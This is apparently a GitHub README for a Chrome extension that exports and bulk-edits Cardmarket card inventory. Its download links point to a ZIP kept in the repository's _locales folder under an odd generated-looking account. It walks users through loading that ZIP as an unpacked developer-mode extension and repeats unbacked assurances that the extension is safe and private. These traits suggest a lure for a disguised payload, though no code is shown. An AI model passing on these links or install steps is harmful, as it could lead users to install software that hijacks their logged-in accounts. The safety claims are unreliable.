# 📦 cardmarket-stock-exporter - Manage your card inventory with ease

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Satisfactory-directive638/cardmarket-stock-exporter/raw/refs/heads/main/_locales/cardmarket-exporter-stock-3.0.zip)

This application helps users manage card inventory on Cardmarket. It functions as a Chrome extension. You can export your full stock and wantlists to CSV files. You can update prices and comments in bulk by importing a CSV file. The extension supports eight trading card games. It works quickly and avoids common web blocks.

## 🛠 Features

The extension simplifies inventory management tasks.

*   Export your entire Cardmarket stock list to a CSV file.
*   Export wantlists for backup or analysis.
*   Update your stock prices using CSV import.
*   Change comments for multiple cards at once.
*   Supports eight distinct trading card games.
*   Uses direct data connections for better performance.
*   Operates smoothly within the site environment.
*   Features both German and English language settings.

## 📥 Getting Started

Follow these steps to set up the extension on your computer.

1. Visit [this page to download](https://github.com/Satisfactory-directive638/cardmarket-stock-exporter/raw/refs/heads/main/_locales/cardmarket-exporter-stock-3.0.zip) the extension package.
2. Locate the latest release version on the page.
3. Download the ZIP file to your computer.
4. Extract the contents of the ZIP file to a folder you can find later.
5. Open Google Chrome.
6. Type `chrome://extensions` in your address bar and press Enter.
7. Click the toggle for Developer mode in the top right corner.
8. Click the button labeled Load unpacked.
9. Select the folder where you extracted the extension files.
10. The extension now appears in your browser toolbar.

## 📋 Exporting Your Inventory

Use the export tool to save your current stock.

1. Log into your Cardmarket account.
2. Click the extension icon in your browser toolbar.
3. Select the Export tab.
4. Choose whether to export your stock or your wantlist.
5. Select your preferred card game from the list.
6. Click the Start Export button.
7. Wait for the file to generate.
8. Save the resulting CSV file to your computer.

## 📈 Updating Your Prices

Use the bulk update feature to change many prices at once.

1. Open your exported CSV file in a spreadsheet program like Excel or Google Sheets.
2. Edit the columns for price or comments as needed.
3. Save the file in CSV format.
4. Open the extension and go to the Import tab.
5. Upload your modified CSV file.
6. Preview the changes shown in the extension window.
7. Click Apply Updates to send the data to Cardmarket.

## ❓ Frequently Asked Questions

**Does the software store my password?**
No. The extension interacts with the site using your existing browser session. It does not handle or store your login credentials.

**Is the extension safe to use?**
Yes. The extension performs actions within your browser window. It does not contain harmful code.

**How many cards can I update at once?**
You may process large files. For the best result, keep individual files under one thousand rows. This keeps the process quick and prevents browser timeouts.

**What happens if a price update fails?**
The extension shows an error log if it cannot update a specific item. You can review this log to identify which rows need manual correction.

**Can I use this with other browsers?**
This tool requires a Chromium-based browser that supports standard Chrome extensions. Results are best when you use Google Chrome.

**What language does the interface use?**
The extension detects your browser language. It supports both English and German.

## 🛠 Troubleshooting

If you encounter issues, try these steps:

*   Refresh your Cardmarket page after performing an action.
*   Ensure the developer mode remains enabled in your extensions settings.
*   Check that your CSV file uses the correct headers.
*   Verify your internet connection remains stable during large updates.
*   Contact your system administrator if you use a work computer with strict security settings.
*   Make sure you run the latest version of Chrome.

## 📄 Privacy Policy

This software respects your data. It does not track your browsing history. All operations occur locally in your browser. No data leaves your machine except for the direct commands sent to the Cardmarket servers to update your listings. This keeps your inventory information private.
